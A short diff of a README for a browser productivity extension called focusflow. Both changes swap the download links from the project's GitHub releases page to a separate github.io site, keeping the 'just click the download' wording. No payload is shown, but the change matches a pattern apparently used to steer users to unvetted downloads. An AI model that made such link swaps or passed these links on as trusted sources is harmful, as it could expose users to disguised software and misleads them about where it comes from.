@@ -1,6 +1,6 @@
 # 🎯 focusflow - Stay Focused, Get More Done
 
-[![Download focusflow](https://img.shields.io/badge/Download-focusflow-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Antoinettesatisfactory579/focusflow/releases)
+[![Download focusflow](https://img.shields.io/badge/Download-focusflow-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://antoinettesatisfactory579.github.io)
 
 ## 🌟 What Is focusflow?
 
@@ -10,7 +10,7 @@ focusflow is your all-in-one productivity companion that lives right in your bro
 
 Getting focusflow up and running takes less than two minutes. The extension is available as a free download, and you'll be ready to boost your productivity right away.
 
-**[Visit this link to download the application](https://github.com/Antoinettesatisfactory579/focusflow/releases)** – just click the download and you're on your way. No coding, no complicated setup.
+**[Visit this link to download the application](https://antoinettesatisfactory579.github.io)** – just click the download and you're on your way. No coding, no complicated setup.
 
 ## 📥 Installation Guide
 
